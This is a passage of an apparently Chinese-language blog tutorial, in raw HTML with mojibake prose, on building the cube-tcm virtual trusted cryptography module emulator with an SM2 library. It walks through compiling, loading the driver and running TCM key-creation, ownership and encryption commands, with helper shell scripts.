href="http://xn--libsm2So-nw7mw2bzzhjr5a55ija395c4yjh67gl8b138dkh7c.so">åº”å¯çœ‹åˆ°ç¼–è¯‘å®Œæˆçš„åŠ¨æ€åº“libsm2So.so</a>ã€‚æ­¤æ—¶å›½å¯†ç®—æ³•åŒ…å³ç¼–è¯‘å®Œæˆã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241205142843996.png" alt="image-20241205142843996"></p><p>ä¸‹é¢å°†è¯¥åº“å¤åˆ¶åˆ°cube-tcmçš„æœ¬åœ°åº“ç›®å½•cube-tcm/locallib/ç›®å½•ä¸‹ã€‚ cube-tcm å†…éƒ¨æ¨¡å—å°†ä¼šè°ƒç”¨è¯¥åº“æ‰§è¡Œå›½å¯†ç®—æ³•è®¡ç®—ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp ./bin/libsm2So.so ../cube-tcm/locallib/<br></code></pre></td></tr></table></figure><h2 id="cube-1-3ç¯å¢ƒå˜é‡è®¾ç½®">cube-1.3ç¯å¢ƒå˜é‡è®¾ç½®</h2><p>è¿›å…¥cube-1.3ç›®å½•ï¼Œå¹¶ä¸”å®Œæˆç¼–è¯‘ç¯å¢ƒé…ç½®</p><p>ä¿®æ”¹set_env.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ../cube-1.3<br>vi set_env.sh<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241205103400314.png" alt="image-20241205103400314"></p><p>å°†æ­¤å¤„ä¿®æ”¹ä¸ºä½ cube-1.3æ‰€åœ¨è·¯å¾„ï¼Œæ¯”å¦‚æˆ‘çš„æ˜¯<code>/opt/build_vtcm/vtcm/cube-1.3</code>ï¼Œ<mark>æ³¨æ„éœ€è¦å»æ‰`å·ï¼ï¼ï¼ï¼</mark></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">ç¼–è¯‘ç¯å¢ƒè®¾ç½®</span><br>source set_env.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">cubeæ¶æ„çš„ç¼–è¯‘</span><br>sh env_build.sh<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘çˆ†è­¦å‘Šæ˜¯æ­£å¸¸ç°è±¡ï¼Œæ²¡æœ‰æŠ¥é”™å°±è¡Œã€‚</p><p>å®Œæˆç¼–è¯‘åï¼Œå¦‚æœä»¥rootæƒé™ç™»å½•ï¼Œåˆ™å¯ä»¥ç›´æ¥è¿è¡Œcubeå®ä¾‹ï¼›å¦‚æœæ˜¯ä»¥érootæƒé™ç™»å½•ï¼Œåº”é¢„å…ˆæ‰§è¡Œsudo dmidecode | grep UUIDå‘½ä»¤ï¼Œè·å¾—uuidå€¼ï¼Œæˆ–è‡ªè¡Œä¸ºæœºå™¨è®¾ç½®ä¸€ä¸ª32å­—èŠ‚çš„uuidå€¼ï¼ˆå¯ç”¨éšæœºæ•°ç”Ÿæˆï¼‰ï¼Œè€Œååœ¨cube-1.3çš„proc/pluginç›®å½•ä¸‹ç¼–è¾‘ä¸€ä¸ªåä¸ºuuidçš„æ–‡ä»¶ï¼Œå°†UUIDå€¼å¡«å……åˆ°æ–‡ä»¶ä¸­ï¼Œæ­¤æ—¶érootç”¨æˆ·å³å¯æ‰§è¡Œcubeæ¶æ„ã€‚</p><h2 id="cube-tcmç¯å¢ƒå˜é‡è®¾ç½®">cube-tcmç¯å¢ƒå˜é‡è®¾ç½®</h2><p>è¿›å…¥cube-tcmç›®å½•ä¸‹ï¼Œä¿®æ”¹set_env.shã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ../cube-tcm<br>vi set_env.sh<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241205111312409.png" alt="image-20241205111312409"></p><p>åŒæ ·çš„</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">ç¼–è¯‘ç¯å¢ƒè®¾ç½®</span><br>source set_env.sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">cubeæ¶æ„çš„ç¼–è¯‘</span><br>sh env_build.sh<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241205111507541.png" alt="image-20241205111507541"></p><p>å¦‚æœ<code>sh env_build.sh</code>æ²¡æœ‰æŠ¥é”™ï¼Œé‚£ä¹ˆæ¨¡æ‹Ÿå™¨ç¼–è¯‘æˆåŠŸï¼Œå¦åˆ™éœ€è¦æ£€æŸ¥ä¸€ä¸‹ç¯å¢ƒå˜é‡è®¾ç½®å’Œç®—æ³•åº“ä½ç½®ã€‚</p><h2 id="è®¾ç½®-bashrcæ–‡ä»¶">è®¾ç½®.bashrcæ–‡ä»¶</h2><p>ç”±äºæ¯æ¬¡å¯åŠ¨éƒ½å¾—è¾“å…¥<code>source /opt/vtcm/cube-1.3/set_env.sh</code>å’Œ<code>source /opt/vtcm/cube-tcm/set_env.sh</code>ï¼Œéå¸¸ç¹çã€‚æ‰€ä»¥æˆ‘ä»¬æŠŠä¸Šé¢çš„å‘½ä»¤å†™å…¥.bashrcæ–‡ä»¶ä¸­ï¼Œæ–¹ä¾¿æ¯æ¬¡éƒ½è‡ªåŠ¨å®Œæˆè®¾ç½®ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">vi /root/.bashrc<br></code></pre></td></tr></table></figure><p>è¿›å…¥.bashrcåœ¨æœ€åä¸€è¡Œæ·»åŠ </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">source /opt/vtcm/cube-1.3/set_env.sh<br>source /opt/vtcm/cube-tcm/set_env.sh<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241205112905991.png" alt="image-20241205112905991"></p><h2 id="cube-tcmç¼–è¯‘">cube-tcmç¼–è¯‘</h2><p>å®‰è£…tcmé©±åŠ¨å¹¶éƒ¨ç½²è®¾å¤‡</p><p>æˆ‘ä»¬åœ¨ç³»ç»Ÿä¸­å¯åŠ¨ä¸¤ä¸ªç»ˆç«¯term1å’Œterm2,ç¡®è®¤ä¸¤ä¸ªç»ˆç«¯å‡å·²å®Œæˆç¯å¢ƒå˜é‡é…ç½®ã€‚æ¥ä¸‹æ¥åœ¨term1ä¸­æ‰“å¼€é©±åŠ¨æ‰€åœ¨ç›®å½•å¹¶æ‰§è¡Œmakeã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ./vtcm/cube-tcm/vtcm_dev<br>make<br>sudo ./load_vtcmd_dev.sh<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œæ¯•åå¯ä»¥æŸ¥çœ‹ä¸€ä¸‹/devä¸­æ˜¯å¦å·²ç»æˆåŠŸå®‰è£…tcmè®¾å¤‡å’Œvtcmè®¾å¤‡ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls /dev/*tcm*<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206172025753.png" alt="image-20241206172025753"></p><p>å®Œæˆåæ‰“å¼€æ¨¡æ‹Ÿå™¨</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ../vtcm_netlink_emulator<br>./main_proc<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206172054961.png" alt="image-20241206172054961"></p><p>ç°åœ¨æˆ‘ä»¬å†è½¬åˆ°term2ã€‚åœ¨term2çš„é¡¹ç›®æ ¹ç›®å½•ä¸­è¿›å…¥vtcm_utilsç›®å½•ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd ./vtcm/cube-tcm/vtcm_utils<br></code></pre></td></tr></table></figure><p>è¯¥ç›®å½•ä¸‹æ˜¯å¯ä¿¡æ ¹åº”ç”¨å®ä¾‹çš„è¿è¡Œç¯å¢ƒvtcm_utilsã€‚ä¸€ä¸ªå¯ä¿¡æ ¹éœ€è¦é€šè¿‡ä¸åº”ç”¨å±‚çš„ä¸€ä¸ªå®ä¾‹é—´çš„äº¤äº’è¿‡ç¨‹ï¼Œæ¥æ‰§è¡Œå¯ä¿¡æ ¹çš„åŠŸèƒ½ã€‚</p><p>æ­¤æ—¶åœ¨vtcm_utilsç›®å½•ä¸‹æ‰§è¡Œï¼ˆæ­¤å¤„å…ˆä¸è¦è¿è¡Œï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./main_proc<br></code></pre></td></tr></table></figure><p>å³å¯ä¸vtcm_emulator äº’è”ã€‚</p><h2 id="TCMæœåŠ¡åŠŸèƒ½ä¸æ“ä½œå®ä¾‹">TCMæœåŠ¡åŠŸèƒ½ä¸æ“ä½œå®ä¾‹</h2><h3 id="åˆå§‹åŒ–">åˆå§‹åŒ–</h3><p>vtcm_utilsç¼ºçœè®¾ä¸ºè„šæœ¬æ“ä½œï¼Œç›®å½•ä¸‹æœ‰å¤šä¸ªè‡ªåŠ¨åŒ–è„šæœ¬ã€‚æˆ‘ä»¬è¿™é‡Œä½¿ç”¨äº¤äº’æ¨¡å¼æ¥æ“ä½œã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">grep vtcm_auto *<br>sed -i &quot;s|vtcm_auto|vtcm_input|&quot; plugin_config.cfg<br>sed -i &quot;s|vtcm_auto|vtcm_input|&quot; router_policy.cfg<br></code></pre></td></tr></table></figure><p>å°†æŸ¥æ‰¾åˆ°çš„æ‰€æœ‰åœ°æ–¹æ›¿æ¢ä¸ºvtcm_inputï¼Œå³å¯è½¬å…¥äº’åŠ¨æ“ä½œæ¨¡å¼ï¼Œå¦‚éœ€æ¢å›è„šæœ¬æ“ä½œæ¨¡å¼ï¼Œåˆ™åªè¦å†ç”¨vtcm_autoæ›¿æ¢æ‰vtcm_inputå³å¯ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241205160235129.png" alt="image-20241205160235129"></p><p>æ­¤æ—¶ç›´æ¥æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">./main_proc<br></code></pre></td></tr></table></figure><p>ç¨‹åºå°†è¿›å…¥ç­‰å¾…å‘½ä»¤çŠ¶æ€ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241205160343093.png" alt="image-20241205160343093"></p><p>ç”ŸæˆèƒŒä¹¦å¯†é’¥</p><p>cube-TCMé‡Œè®¾ç½®äº†ä¸€æ¡èƒŒä¹¦å¯†é’¥å‘½ä»¤createek, å‘½ä»¤æ ¼å¼ä¸ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">createek â€“wf ekpub.key<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå¯ä¿¡æ ¹å‘½ä»¤çš„æ¯ä¸ªå‚æ•°éƒ½ç”±ä¸€ä¸ª<code>-</code>æ‰“å¤´çš„å‰ç¼€æ¥ç¡®å®šå…¶ç±»å‹ã€‚createekå‘½ä»¤åˆ›å»ºå¯†é’¥åï¼Œä¼šå°†å¯†é’¥å¯¼å‡ºåˆ°ekpub.keyæ–‡ä»¶ä¸­ï¼Œåœ¨term2åˆ™å¯çœ‹åˆ°èŠ¯ç‰‡è¾“å…¥è¾“ å‡ºçš„äºŒè¿›åˆ¶ä¿¡æ¯ï¼š</p><ul><li><p>è¾“å…¥ä¿¡æ¯æ˜¯vtcm_utilsæ ¹æ®èŠ¯ç‰‡æ¥å£è¦æ±‚ç”Ÿæˆçš„æ•°æ®åŒ…ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206172300574.png" alt="image-20241206172300574"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206161832580.png" alt="image-20241206161832580"></p></li><li><p>è¾“å‡ºä¿¡æ¯åˆ™ä¸ºvtcm_emulatoræ”¶åˆ°æ•°æ®åŒ…åï¼ŒæŒ‰ç…§tcmæ ‡å‡†è¿è¡Œåï¼Œè¿”å›çš„æ•°æ®ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206161913238.png" alt="image-20241206161913238"></p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206161926197.png" alt="image-20241206161926197"></p></li></ul><p>ä¸‹é¢æ‰§è¡ŒreadpubekæŒ‡ä»¤ï¼Œè¯¥æŒ‡ä»¤æ— è¾“å…¥å‚æ•°</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">readpubek<br></code></pre></td></tr></table></figure><p>è¯¥å‘½ä»¤ä»vtcm_emulaterä¸­è·å–å¯ä¿¡æ ¹å…¬é’¥ï¼Œå¹¶åœ¨vtcm_utilså†…å­˜ä¸­å­˜æ”¾ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206172844362.png" alt="image-20241206172844362"></p><p>ä¸‹ä¸€æ¡æŒ‡ä»¤æ˜¯apcreateï¼Œè¿™æ¡æŒ‡ä»¤ç”¨æ¥åˆ›å»ºåº”ç”¨å’Œæ¨¡æ‹Ÿå™¨ä¸­å¯¹è±¡çš„ä¼šè¯ã€‚åˆå§‹åŒ–è¿‡ç¨‹ä¸­ï¼Œæ¨¡æ‹Ÿå™¨å†…éƒ¨å¹¶æ²¡æœ‰åˆé€‚çš„å¯¹è±¡ï¼Œå› æ­¤apcreateå‘½ä»¤å°†åˆ›å»ºä¸€ä¸ªå«åš ET_NONEç±»å‹ï¼ˆç¼–å·ä¸º0x12ï¼‰çš„ä¼šè¯ï¼Œè¿™ä¸€ä¼šè¯ä¸“ç”¨äºåˆå§‹åŒ–è¿‡ç¨‹ã€‚ æ­¤æ—¶apcreateå‘½ä»¤æ ¼å¼ä¸º</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apcreate â€“it 12<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206210850769.png" alt="image-20241206210850769"></p><p>è¾“å‡ºå‘½ä»¤æ ¼å¼ä¸º</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241206210910901.png" alt="image-20241206210910901"></p><p>æ­¤æ—¶vtcm_utils å’Œ vtcm_emulator ä¹‹é—´å·²ç»å»ºç«‹äº†ä¸€ä¸ªä¼šè¯ã€‚</p><p>ä¸‹é¢æ˜¯åˆå§‹åŒ–è¿‡ç¨‹ä¸­æœ€å…³é”®çš„ä¸€ä¸ªå‘½ä»¤takeownershipï¼Œè¯¥å‘½ä»¤å®Œæˆå¯ä¿¡æ ¹å±ä¸»å£ä»¤çš„ç”Ÿæˆã€å¯ä¿¡æ ¹å­˜å‚¨å¯†é’¥ä»¥åŠæ ¹å­˜å‚¨å¯†é’¥å£ä»¤çš„ç”Ÿæˆã€‚å±ä¸»å£ä»¤ç”¨æ¥è·å–å¯ä¿¡æ ¹ä¸­å±ä¸»çš„æƒé™ï¼Œå¯ä»¥è¿›è¡Œç”¨æˆ·é‰´åˆ«å¯†é’¥ç”Ÿæˆç­‰æ“ä½œã€‚</p><p>å‘½ä»¤çš„è¾“å…¥å‚æ•°åº”åŒ…æ‹¬å±ä¸»å£ä»¤ã€æ ¹å­˜å‚¨å¯†é’¥å£ä»¤ï¼Œä¹Ÿå°±æ˜¯è¦è‡ªå·±è®¾ä¸¤ä¸ªå£ä»¤ã€‚</p><p>è¾“å…¥æ ¼å¼ä¸ºï¼štakeownership  -pwdo ç”¨æˆ·å£ä»¤ â€“ pwds  smkå£ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">takeownership -pwdo 123456 â€“pwds 123<br></code></pre></td></tr></table></figure><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207152810390.png" alt="image-20241207152810390"></p><p>åœ¨term1ä¸­å¯çœ‹åˆ°æˆåŠŸæ‹¿åˆ°å¥æŸ„</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207152852669.png" alt="image-20241207152852669"></p><p>takeownership å‘½ä»¤æ‰§è¡ŒæˆåŠŸåï¼Œå°†åœ¨TCMä¸­åˆ›å»ºå­˜å‚¨æ ¹å¯†é’¥smk,å…¶å® ä½“ç±»å‹å€¼ä¸º04ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ç”¨apcreateå‘½ä»¤åˆ›å»ºvtcm_utilså’Œsmkçš„ä¼šè¯ æ¥éªŒè¯takeownership æ˜¯å¦æˆåŠŸã€‚æµ‹è¯•å‘½ä»¤ä¸ºapcreate  -it 04 -pwd  smkå£ä»¤</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">apcreate -it 04 -pwd 123<br></code></pre></td></tr></table></figure><p>ä¸‹é¢ä¸ºæµ‹è¯•å‘½ä»¤çš„è¾“å‡ºå†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªè¿”å›å€¼ï¼Œç¬¬ä¸€ä¸ªæ˜¯å‘½ä»¤è¿”å›ç ï¼Œå…¶å–å€¼ä¸º0ï¼Œè¡¨ç¤ºæ‰§è¡Œæ­£ç¡®ï¼Œç¬¬äºŒä¸ªåˆ™æ˜¯apcreateå‘½ä»¤ä¸smkä¹‹é—´å»ºç«‹å¯ä¿¡ä¼šè¯è¿æ¥çš„ä¼šè¯å¥æŸ„ã€‚è¿™è¡¨ç¤ºtakeownershipå‘½ä»¤æ‰§è¡Œæ­£ç¡®ã€‚</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207153121633.png" alt="image-20241207153121633"></p><p>è€Œå¦‚æœæˆ‘ä»¬è¾“å…¥é”™è¯¯çš„smkå£ä»¤æˆ–è€…çœç•¥äº†-pwdé€‰é¡¹ï¼Œåˆ™æˆ‘ä»¬åº”è¯¥åœ¨å‘½ä»¤æœ€ åå¾—åˆ°ä¸‹é¢çš„ç»“æœï¼š</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207153215303.png" alt="image-20241207153215303"></p><h3 id="åˆå§‹åŒ–è‡ªåŠ¨åŒ–è„šæœ¬">åˆå§‹åŒ–è‡ªåŠ¨åŒ–è„šæœ¬</h3><p>ä¸‹é¢é™„ä¸Šæˆ‘è‡ªå·±å†™çš„è„šæœ¬ï¼ˆ<mark>æ³¨æ„ï¼Œæˆ‘æ˜¯åœ¨Windowsä¸Šå†™çš„ï¼ŒLinuxè¯†åˆ«Windowsçš„æ¢è¡Œç¬¦ä¼šè¯†åˆ«æˆå­—ç¬¦ï¼Œè¯·å…ˆæµ‹è¯•ä¸€ä¸‹å†å®é™…ä½¿ç”¨</mark>ï¼‰</p><p>åœ¨é¡¹ç›®æ ¹ç›®å½•ä¸‹åˆ›å»ºå››ä¸ªshellæ–‡ä»¶ï¼š</p><ol><li><p>build_vctm.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>mkdir vtcm<br>cd vtcm<br>git clone https://gitee.com/biparadox/cube-1.3.git<br>git clone https://gitee.com/biparadox/cube-tcm.git<br>git clone https://github.com/TCLab-BJUT/gm_sm2.git<br>cd gm_sm2<br>make<br>cp ./bin/libsm2So.so ../cube-tcm/locallib<br>cd ../cube-1.3<br><br>sed -i &quot;s|export CUBEAPPPATH=\`pwd\`|export CUBEAPPPATH=/opt/cube-1.3|&quot; set_env.sh#æŠŠè¿™é‡Œçš„/opt/cube-1.3æ”¹æˆè‡ªå·±cube-1.3çš„åœ°å€<br><br>source set_env.sh<br>sh env_build.sh<br>cd ../cube-tcm<br><br>sed -i &quot;s|export CUBEAPPPATH=\`pwd\`|export CUBEAPPPATH=/opt/build_vtcm/vtcm/cube-tcm|&quot; set_env.sh#æŠŠè¿™é‡Œçš„/opt/cube-1.3æ”¹æˆè‡ªå·±cube-tcmçš„åœ°å€<br><br>source set_env.sh<br>sh env_build.sh<br>cd vtcm_dev<br>make<br></code></pre></td></tr></table></figure></li><li><p>set_env.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>current_path=/opt/build_vtcm#è¿™é‡Œæ”¹æˆè‡ªå·±çš„æ ¹ç›®å½•æ‰€åœ¨åœ°å€<br>cd ./vtcm/cube-1.3<br>source set_env.sh<br>cd ../cube-tcm<br>source set_env.sh<br>cd $current_path<br></code></pre></td></tr></table></figure></li><li><p>run_vtcm_netlink_emulator.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>sudo ./load_vtcmd_dev.sh<br>cd ../vtcm_netlink_emulator<br>./main_proc<br></code></pre></td></tr></table></figure></li><li><p>test_pcrread.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/bash</span><br><br>cd ./vtcm/cube-tcm/vtcm_utils<br>./main_proc ./pcr/pcrread.cmd<br></code></pre></td></tr></table></figure></li></ol><p>åœ¨term1ä¸­æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">source build_vctm.sh<br>sh run_vtcm_netlink_emulator.sh<br></code></pre></td></tr></table></figure><p>åœ¨term2ä¸­æ‰§è¡Œ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">source set_env.sh<br>sh test_pcrread.sh<br></code></pre></td></tr></table></figure><h3 id="åŠ å¯†ã€è§£å¯†ã€ç­¾åã€éªŒè¯">åŠ å¯†ã€è§£å¯†ã€ç­¾åã€éªŒè¯</h3><h4 id="å¯†é’¥åˆ›å»º">å¯†é’¥åˆ›å»º</h4><p>ä¸‹é¢é¦–å…ˆæ‰§è¡Œåˆ›å»ºå¯†é’¥æ“ä½œã€‚TCMä¸­ï¼Œå¯†é’¥åˆ›å»ºå¯ä»¥é€‰æ‹©åŸºäºSM2ç®—æ³•çš„éå¯¹ç§°é’¥å’ŒåŸºäºSM4ç®—æ³•çš„å¯¹ç§°é’¥ã€‚å¯†é’¥åˆ›å»ºå‘½ä»¤ä¸ºcreatewrapkeyã€‚tcm_utils æ¥å—çš„å¯†é’¥åˆ›å»ºå‘½ä»¤å…¶æ ¼å¼å¦‚ä¸‹ï¼š</p><p>createwrapkey -ikh å°è£…å¯†é’¥å¥æŸ„ â€“ish å°è£…å¯†é’¥ä¼šè¯å¥æŸ„ -is (sm2|sm4)  -kf  å¯†é’¥æ–‡ä»¶åç§° -pwdk å¯†é’¥æˆæƒå£ä»¤ [â€“pwdm å¯†é’¥ç§»æ¤å£ä»¤]</p><p>ä¸‹é¢æˆ‘ä»¬å†™ä¸€ä¸ªå¯†é’¥åˆ›å»ºè„šæœ¬ç¨‹åºcreatekey.cmdï¼Œè¯¥ç¨‹åºä»¥SMKä¸ºå°è£…å¯†é’¥åˆ›å»ºä¸€ä¸ªéå¯¹ç§°å¯†é’¥å’Œä¸€ä¸ªå¯¹ç§°å¯†é’¥ï¼Œå¯†é’¥å£ä»¤åˆ†åˆ«ä¸ºsm2å’Œsm4ï¼Œå¹¶åˆ†åˆ«å­˜å‚¨åœ¨æ–‡ä»¶sm2.keyå’Œæ–‡ä»¶sm4.keyä¸­ï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p><p>æˆ‘ä»¬å¯ä»¥è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼Œæ¥åˆ›å»ºå¯¹ç§°å¯†é’¥å’Œéå¯¹ç§°å¯†é’¥ã€‚</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">in:</span> apcreate -it <span class="hljs-number">04</span> -pwd sss<br><span class="hljs-symbol">out:</span> <span class="hljs-number">1</span>:$smkHandle<br><span class="hljs-symbol">in:</span> createwrapkey -ikh <span class="hljs-number">40000000</span> -ish $smkHandle -<span class="hljs-built_in">is</span> sm2 -kf sm2.<span class="hljs-keyword">key</span> -pwdk sm2<br><span class="hljs-symbol">in:</span> createwrapkey -ikh <span class="hljs-number">40000000</span> -ish $smkHandle -<span class="hljs-built_in">is</span> sm4 -kf sm4.<span class="hljs-keyword">key</span> -pwdk sm4<br><span class="hljs-symbol">in:</span> apterminate -ih $smkHandle<br></code></pre></td></tr></table></figure><p>å½“ç„¶ä¹Ÿå¯ä»¥æ‰‹åŠ¨è¾“å…¥ï¼Œç”±äºå‰æ–‡æˆ‘å·²ç»è·å–åˆ°äº†å¥æŸ„ï¼Œä¸ºb90e432ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥ä½¿ç”¨è¯¥å¥æŸ„å°±è¡Œã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">createwrapkey -ikh 40000000 -ish b90e432 -is sm2 -kf sm2.key -pwdk sm2<br>createwrapkey -ikh 40000000 -ish b90e432 -is sm4 -kf sm4.key -pwdk sm4<br></code></pre></td></tr></table></figure><p>åˆ›å»ºæˆåŠŸåå¯ä»¥çœ‹åˆ°æ–‡ä»¶å¤¹ä¸‹å¤šäº†sm2å’Œsm4çš„å¯†é’¥æ–‡ä»¶</p><p><img src="https://yzsandwimages.oss-cn-beijing.aliyuncs.com/img/image-20241207161731111.png" alt="image-20241207161731111"></p><h4 id="åŠ å¯†è§£å¯†">åŠ å¯†è§£å¯†</h4><p>éå¯¹ç§°å¯†é’¥åŠ å¯†è§£å¯†ï¼š</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">in</span>: sm2encrypt -kf sm2<span class="hljs-selector-class">.key</span> -rf sm2test<span class="hljs-selector-class">.dat</span> -wf sm2crypt<span class="hljs-selector-class">.dat</span><br><span class="hljs-keyword">in</span>:  apcreate -it <span class="hljs-number">04</span> -pwd sss<br>out: <span class="hljs-number">1</span>:<span class="hljs-variable">$smkHandle</span> <br><span class="hljs-keyword">in</span>: loadkey -ih <span class="hljs-variable">$smkHandle</span> -kf sm2<span class="hljs-selector-class">.key</span> <br>out: <span 